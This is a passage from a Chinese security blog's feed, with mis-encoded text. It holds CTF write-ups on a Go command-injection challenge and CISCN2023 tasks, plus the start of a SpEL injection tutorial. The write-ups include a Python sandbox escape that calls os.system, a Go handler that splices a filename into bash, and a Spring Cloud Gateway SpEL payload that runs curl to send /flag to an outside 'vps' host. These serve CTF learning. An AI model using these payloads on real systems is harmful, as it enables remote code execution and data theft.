æœ€é¡¶å±‚å®¹å™¨ç»„ä»¶ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Hostã€‚å®ç°ç±»ä¸º  <code>org.apache.catalina.core.StandardEngine</code></li><li>Host: ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºå’ŒæŸä¸ªåŸŸå Domain Name ç›¸åŒ¹é…ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Contextã€‚å®ç°ç±»ä¸º  <code>org.apache.catalina.core.StandardHost</code></li><li>Context: ä¸€ä¸ª Context å¯¹åº”äºä¸€ä¸ª Web åº”ç”¨ï¼Œå¯ä»¥åŒ…å«å¤šä¸ª Wrapperã€‚å®ç°ç±»ä¸º  <code>org.apache.catalina.core.StandardContext</code></li><li>Wrapper: ä¸€ä¸ª Wrapper å¯¹åº”ä¸€ä¸ª Servletã€‚è´Ÿè´£ç®¡ç† Servlet ï¼ŒåŒ…æ‹¬ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚å®ç°ç±»ä¸º  <code>org.apache.catalina.core.StandardWrapper</code></li></ul></blockquote><p>çœ‹ä¸‹é¢è¿™ä¸ªå›¾å¯èƒ½ä¼šæ›´ç›´è§‚ä¸€äº›</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/tomcat3.png" alt="img"></p><p>é€šå¸¸ä¸€ä¸ª Servlet class å¯¹åº”ä¸€ä¸ª Wrapperï¼Œå¦‚æœæœ‰å¤šä¸ª Servlet å°±å¯ä»¥å®šä¹‰å¤šä¸ª Wrapperï¼Œå¦‚æœæœ‰å¤šä¸ª Wrapper å°±è¦å®šä¹‰ä¸€ä¸ªæ›´é«˜çš„ Containerã€‚</p><p>ä¸¾ä¸ªğŸŒ°ï¼Œa.com å’Œ b.com åˆ†åˆ«å¯¹åº”ç€ä¸¤ä¸ª Host</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/TomcatContainer.png" alt="img"></p><p>æ¯ä¸€ä¸ª Context éƒ½æœ‰å”¯ä¸€çš„ pathã€‚è¿™é‡Œçš„ path ä¸æ˜¯æŒ‡ servlet ç»‘å®šçš„ WebServlet åœ°å€ï¼Œè€Œæ˜¯æŒ‡ç‹¬ç«‹çš„ä¸€ä¸ª Web åº”ç”¨åœ°å€ã€‚å°±å¥½æ¯” Tomat é»˜è®¤çš„ / åœ°å€å’Œ /manager åœ°å€å°±æ˜¯ä¸¤ä¸ªä¸åŒçš„ web åº”ç”¨ï¼Œæ‰€ä»¥å¯¹åº”ä¸¤ä¸ªä¸åŒçš„ Contextã€‚è¦æ·»åŠ  Context éœ€è¦åœ¨ server.xml ä¸­é…ç½® docbaseã€‚</p><h2 id="0x05-tomcatçš„ç±»åŠ è½½æœºåˆ¶"><a class="markdownIt-Anchor" href="#0x05-tomcatçš„ç±»åŠ è½½æœºåˆ¶">#</a> 0x05 Tomcat çš„ç±»åŠ è½½æœºåˆ¶</h2><blockquote><p>ç”±äº Tomcat ä¸­æœ‰å¤šä¸ª WebApp åŒæ—¶è¦ç¡®ä¿ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œæ‰€ä»¥ Tomcat çš„ç±»åŠ è½½æœºåˆ¶ä¹Ÿä¸æ˜¯ä¼ ç»Ÿçš„åŒäº²å§”æ´¾æœºåˆ¶ã€‚</p><p>Tomcat è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ WebAppClassloader ä¸ºäº†ç¡®ä¿éš”ç¦»å¤šä¸ª WebApp ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œæ‰€ä»¥æ‰“ç ´äº†åŒäº²å§”æ‰˜æœºåˆ¶ã€‚æ¯ä¸ª WebApp ç”¨ä¸€ä¸ªç‹¬æœ‰çš„ ClassLoader å®ä¾‹æ¥ä¼˜å…ˆå¤„ç†åŠ è½½ã€‚å®ƒé¦–å…ˆå°è¯•è‡ªå·±åŠ è½½æŸä¸ªç±»ï¼Œå¦‚æœæ‰¾ä¸åˆ°å†äº¤ç»™çˆ¶ç±»åŠ è½½å™¨ï¼Œå…¶ç›®çš„æ˜¯ä¼˜å…ˆåŠ è½½ WEB åº”ç”¨è‡ªå·±å®šä¹‰çš„ç±»ã€‚</p><p>åŒæ—¶ä¸ºäº†é˜²æ­¢ WEB åº”ç”¨è‡ªå·±çš„ç±»è¦†ç›– JRE çš„æ ¸å¿ƒç±»ï¼Œåœ¨æœ¬åœ° WEB åº”ç”¨ç›®å½•ä¸‹æŸ¥æ‰¾ä¹‹å‰ï¼Œå…ˆä½¿ç”¨ ExtClassLoaderï¼ˆä½¿ç”¨åŒäº²å§”æ‰˜æœºåˆ¶ï¼‰å»åŠ è½½ï¼Œè¿™æ ·æ—¢æ‰“ç ´äº†åŒäº²å§”æ‰˜ï¼ŒåŒæ—¶ä¹Ÿèƒ½å®‰å…¨åŠ è½½ç±»ã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x01-å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-å‰è¨€&quot;&gt;#&lt;/a&gt; 0x01 å‰è¨€&lt;/h2&gt;
&lt;p&gt;ç†Ÿæ‚‰ä¸€ä¸‹ Tomcat æ¡†æ¶&lt;/p&gt;
&lt;h2 id=&quot;0x02-java-web-ä¸‰å¤§</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="å†…å­˜é©¬" scheme="https://ki10moc.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Funny_go</title>
    <link href="https://ki10moc.github.io/2023/07/23/funny_go1/"/>
    <id>https://ki10moc.github.io/2023/07/23/funny_go1/</id>
    <published>2023-07-22T20:20:36.000Z</published>
    <updated>2023-07-28T05:33:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1nLaI1aZpA-IFkInIfKJrCw?pwd=z3q9">æºç è‡ªè¡Œä¸‹è½½</a></p><p>å›è¿‡å¤´å†çœ‹ä¸€ä¸‹ä»£ç </p><p>æœ‰ç”¨çš„åœ°æ–¹å°±æ˜¯ <code>SubmitMoveHandler</code></p><p>ç›´æ¥å» move æ‰“</p><p>å…¶ä»–éƒ½æ˜¯åºŸè¯</p><p>gorm å’Œ gin æ¡†æ¶</p><p>5 ä¸ªè·¯ç”±</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.GET(<span class="string">&quot;/user&quot;</span>, UserHandler)<span class="comment">//ç”¨æˆ·ç™»å½•ä¿¡æ¯</span></span><br><span class="line">router.POST(<span class="string">&quot;/login&quot;</span>, LoginHandler)<span class="comment">//å¯¹æ¯”æ•°æ®åº“ç”¨æˆ·ä¿¡æ¯ç™»å½•</span></span><br><span class="line">router.POST(<span class="string">&quot;/upload&quot;</span>, cookieCheckMiddleware(), UploadHandler) <span class="comment">//æ–‡ä»¶ä¸Šä¼ (éœ€ç™»å½•)</span></span><br><span class="line">router.POST(<span class="string">&quot;/move&quot;</span>, IpSecurityCheck(), SubmitMoveHandler)<span class="comment">//ç§»åŠ¨æ–‡ä»¶(åˆ¤æ–­IP)</span></span><br><span class="line">router.POST(<span class="string">&quot;/download&quot;</span>, cookieCheckMiddleware(), DownloadHandler)<span class="comment">//ä¸‹è½½æ–‡ä»¶(éœ€ç™»å½•)</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»ä»£ç ä¸Šä¸¤ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„ç‚¹</p><p>1ã€IpSecurityCheck</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IpSecurityCheck</span><span class="params">()</span></span> gin.HandlerFunc &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> c.Request.RemoteAddr[:<span class="number">9</span>] != <span class="string">&quot;127.0.0.1&quot;</span> &amp;&amp; c.Request.RemoteAddr[:<span class="number">9</span>] != <span class="string">&quot;localhost&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">403</span>, gin.H&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;No you&#x27;are not allowed&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.Next()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2ã€SubmitMoveHandler</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SubmitMoveHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> filename Filename</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;filename); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;error&quot;</span>: err.Error()&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;mv ./upload/pdf/&quot;</span>+filename.Filename+<span class="string">&quot; ./assert/pdf/&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: filename.Filename&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„ SSRF å’Œå‘½ä»¤æ³¨å…¥</p><p>é‚£ä¹ˆå†æ¥çœ‹ä¸‹å‰ç½®æ­¥éª¤</p><p>é¦–å…ˆæ˜¯ struct è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œgorm åªä¼šæŸ¥è¯¢éé›¶å­—æ®µï¼Œè‹¥å€¼ä¸º 0ï¼Œfalseï¼Œâ€™' æˆ–å…¶ä»–é›¶å€¼</p><p>gorm ä¼šå¿½ç•¥ where æ¡ä»¶</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033803704.png" alt="image-20230723033803704"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033823276.png" alt="image-20230723033823276"></p><p>å¾—åˆ° username å’Œ password</p><p>è¿›è¡Œç™»å½•</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723033947090.png" alt="image-20230723033947090"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723040521720.png" alt="image-20230723040521720"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723034517349.png" alt="image-20230723034517349"></p><p>--------------------------9a28df6f0f9a180f Content-Disposition: form-data; name=â€œxxâ€; filename=â€œflagâ€ Content-Type: application/octet-stream flag{ki10Moc_W0nt_31eep} --------------------------9a28df6f0f9a180fâ€“</p><p>ä½†å…¶å®è¿™é¢˜ä»£ç å†™çš„æœ‰é—®é¢˜</p><p>5 ä¸ªè·¯ç”±åªéœ€è¦ move å³å¯</p><p>å› ä¸º move æ²¡æœ‰èº«ä»½éªŒè¯</p><p>å¯ä»¥ç›´æ¥æ‰“</p><p>å•çº¯çš„å‘½ä»¤æ³¨å…¥</p><p>çªç„¶çœ‹åˆ°æœ‰å‘½ä»¤æ‰§è¡Œï¼</p><p>æ”»å‡»é˜Ÿä¸Šç­äº†ï¼Ÿ</p><p>ä¹ï¼Œå¤ç°é¢˜ç›®è¢«æ€åŠ¿æ„ŸçŸ¥è®°å½•äº†</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/image-20230723012127208.png" alt="image-20230723012127208"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1nLaI1aZpA-IFkInIfKJrCw?pwd=z3q9&quot;&gt;æºç è‡ªè¡Œä¸‹è½½&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å›è¿‡å¤´å†çœ‹ä¸€ä¸‹ä»£ç &lt;/p&gt;
&lt;p&gt;æœ‰ç”¨çš„åœ°æ–¹å°±æ˜¯ &lt;code&gt;SubmitMoveHandler&lt;/co</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Go" scheme="https://ki10moc.github.io/tags/Go/"/>
    
    <category term="Gin" scheme="https://ki10moc.github.io/tags/Gin/"/>
    
    <category term="Gorm" scheme="https://ki10moc.github.io/tags/Gorm/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2023</title>
    <link href="https://ki10moc.github.io/2023/05/28/CISCN_2023/"/>
    <id>https://ki10moc.github.io/2023/05/28/CISCN_2023/</id>
    <published>2023-05-28T15:41:08.000Z</published>
    <updated>2023-05-28T16:40:17.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unzip"><a class="markdownIt-Anchor" href="#unzip">#</a> unzip</h2><p>è½¯é“¾æ¥  é€šè¿‡ var/www/html åŒ…å«é©¬</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290005545.png" alt="image-20230529000548874"></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006532.png" alt="image-20230529000609504"></p><p>å¹¶é€šè¿‡ var ç›®å½•å°†é©¬æ”¾å…¥</p><p>ä¾æ¬¡ä¸Šä¼ </p><p>è¯»å– flag</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006488.png" alt="image-20230529000624465"></p><p 7349cbbd-20da-4b3e-8bd9-36084dac7053="">flag</p><h2 id="pyshell"><a class="markdownIt-Anchor" href="#pyshell">#</a> pyshell</h2><p>Python çš„ shell</p><p>å¯¼å…¥ os åº“æŸ¥çœ‹ flag</p><p>ä½†æ˜¯è¢« ban äº†</p><p>å‘ç° open å’Œ eval è¿˜åœ¨</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290006386.png" alt="image-20230529000654365"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">ä½†æ˜¯è¿˜ban</span><br><span class="line">çŒœæµ‹å¯èƒ½æ˜¯å¯¹é•¿åº¦æœ‰é™åˆ¶</span><br><span class="line"></span><br><span class="line">Welcome to this python shell,<span class="keyword">try</span> to find the flag!</span><br><span class="line">&gt;&gt;<span class="string">&#x27;__imp&#x27;</span></span><br><span class="line"><span class="string">&#x27;__imp&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&#x27;ort&#x27;</span></span><br><span class="line"><span class="string">&#x27;__import&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&#x27;__(&#x27;</span></span><br><span class="line"><span class="string">&#x27;__import__(&#x27;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;&#x27;os&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&quot;</span></span><br><span class="line">&gt;&gt;v</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;v&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;_+<span class="string">&quot;&#x27;).&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;sys&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).sys&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;tem&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;(&#x27;c&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;c&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;at &quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat &quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;/fl&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /fl&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;ag&#x27;&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;&quot;</span></span><br><span class="line">&gt;&gt;_+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /flag&#x27;)&quot;</span></span><br><span class="line">&gt;&gt;<span class="built_in">eval</span>(_)</span><br><span class="line">flag&#123;5dd8032d-4dbf-40c2-9ef9-c86386511c7a&#125;<span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007550.png" alt="image-20230529000712501"></p><p 5dd8032d-4dbf-40c2-9ef9-c86386511c7a="">flag</p><h2 id="backendservice"><a class="markdownIt-Anchor" href="#backendservice">#</a> BackendService</h2><p>ç™»å½•æ¡†</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007016.png" alt="image-20230529000730982"></p><p>å°è¯•çˆ†ç ´æ— æœ</p><p>æŸ¥æ‰¾é»˜è®¤å¯†ç ä¹Ÿä¸è¡Œ</p><p>æœªæˆæƒç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007581.png" alt="image-20230529000739556"></p><p>aa/aa</p><p>è¿›è¡Œç™»å½•</p><p>æ–°å»ºé…ç½®</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007013.png" alt="image-20230529000750982"></p><p>é¢˜ç›®å¤–ç½‘ IP å’Œå†…ç½‘çš„ç«¯å£</p><p>ç›‘å¬åˆ°å†…ç½‘æœºå™¨</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290007913.png" alt="image-20230529000758891"></p><p>æ ¹æ®æ–‡ç« </p><p><a href="#toc-3">Nacos ç»“åˆ Spring Cloud Gateway RCE åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>å†™ poc</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;curl&#x27;,&#x27;vps:5678&#x27;,&#x27;-d&#x27;,&#x27;@/flag&#x27;&#125;).getInputStream())).replaceAll(&#x27;\\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305290008663.png" alt="image-20230529000829618"></p><p e1667a09-38d6-4eb8-b38d-20de0f9269a4="">flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;unzip&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#unzip&quot;&gt;#&lt;/a&gt; unzip&lt;/h2&gt;
&lt;p&gt;è½¯é“¾æ¥  é€šè¿‡ var/www/html åŒ…å«é©¬&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubus</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://ki10moc.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Springboot-Spelè¡¨è¾¾å¼æ³¨å…¥</title>
    <link href="https://ki10moc.github.io/2023/05/04/Springboot-Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://ki10moc.github.io/2023/05/04/Springboot-Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2023-05-04T03:35:36.000Z</published>
    <updated>2023-05-25T08:53:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="0x01-spelè¡¨è¾¾å¼åŸºç¡€"><a class="markdownIt-Anchor" href="#0x01-spelè¡¨è¾¾å¼åŸºç¡€">#</a> 0x01 SpEL è¡¨è¾¾å¼åŸºç¡€</h1><h3 id="spelç®€ä»‹"><a class="markdownIt-Anchor" href="#spelç®€ä»‹">#</a> SpEL ç®€ä»‹</h3><p>åœ¨ Spring 3 ä¸­å¼•å…¥äº† Spring è¡¨è¾¾å¼è¯­è¨€ï¼ˆSpring Expression Languageï¼Œç®€ç§° SpELï¼‰ï¼Œè¿™æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼Œå¯ä»¥ä¸åŸºäº XML å’ŒåŸºäºæ³¨è§£çš„ Spring é…ç½®è¿˜æœ‰ bean å®šä¹‰ä¸€èµ·ä½¿ç”¨ã€‚</p><p>åœ¨ Spring ç³»åˆ—äº§å“ä¸­ï¼ŒSpEL æ˜¯è¡¨è¾¾å¼è®¡ç®—çš„åŸºç¡€ï¼Œå®ç°äº†ä¸ Spring ç”Ÿæ€ç³»ç»Ÿæ‰€æœ‰äº§å“æ— ç¼å¯¹æ¥ã€‚Spring æ¡†æ¶çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€å°±æ˜¯é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼æ¥ç®¡ç† Bean ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œè€Œ SpEL å¯ä»¥æ–¹ä¾¿å¿«æ·çš„å¯¹ ApplicationContext ä¸­çš„ Bean è¿›è¡Œå±æ€§çš„è£…é…å’Œæå–ã€‚ç”±äºå®ƒèƒ½å¤Ÿåœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ†é…å€¼ï¼Œå› æ­¤å¯ä»¥ä¸ºæˆ‘ä»¬èŠ‚çœå¤§é‡ Java ä»£ç ã€‚</p><p>SpEL æœ‰è®¸å¤šç‰¹æ€§ï¼š</p><ul><li>ä½¿ç”¨ Bean çš„ ID æ¥å¼•ç”¨ Bean</li><li>å¯è°ƒç”¨æ–¹æ³•å’Œè®¿é—®å¯¹è±¡çš„å±æ€§</li><li>å¯å¯¹å€¼è¿›è¡Œç®—æ•°ã€å…³ç³»å’Œé€»è¾‘è¿ç®—</li><li>å¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…</li><li>å¯è¿›è¡Œé›†åˆæ“ä½œ</li></ul><h3 id="spelå®šç•Œç¬¦"><a class="markdownIt-Anchor" href="#spelå®šç•Œç¬¦">#</a> SpEL å®šç•Œç¬¦ â€”â€” <code>#&#123;&#125;</code></h3><p>SpEL ä½¿ç”¨ <code>#&#123;&#125;</code>  ä½œä¸ºå®šç•Œç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯ SpEL è¡¨è¾¾å¼ï¼Œåœ¨å…¶ä¸­å¯ä»¥ä½¿ç”¨ SpEL è¿ç®—ç¬¦ã€å˜é‡ã€å¼•ç”¨ bean åŠå…¶å±æ€§å’Œæ–¹æ³•ç­‰ã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„ <code>#&#123;&#125;</code>  å’Œ <code>$&#123;&#125;</code>  çš„åŒºåˆ«ï¼š</p><ul><li><code>#&#123;&#125;</code>  å°±æ˜¯ SpEL çš„å®šç•Œç¬¦ï¼Œç”¨äºæŒ‡æ˜å†…å®¹é€šè¿‡ SpEL è¡¨è¾¾å¼å¹¶æ‰§è¡Œï¼›</li><li><code>$&#123;&#125;</code>  ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼ï¼›</li><li>ä¸¤è€…å¯ä»¥æ··åˆä½¿ç”¨ï¼Œä½†æ˜¯å¿…é¡» <code>#&#123;&#125;</code>  åœ¨å¤–é¢ï¼Œ <code>$&#123;&#125;</code>  åœ¨é‡Œé¢ï¼Œå¦‚ <code>#&#123;'$&#123;&#125;'&#125;</code> ï¼Œæ³¨æ„å•å¼•å·æ˜¯å­—ç¬¦ä¸²ç±»å‹æ‰æ·»åŠ çš„ï¼›</li></ul><h1 id="0x02-ç¯å¢ƒæ­å»º"><a 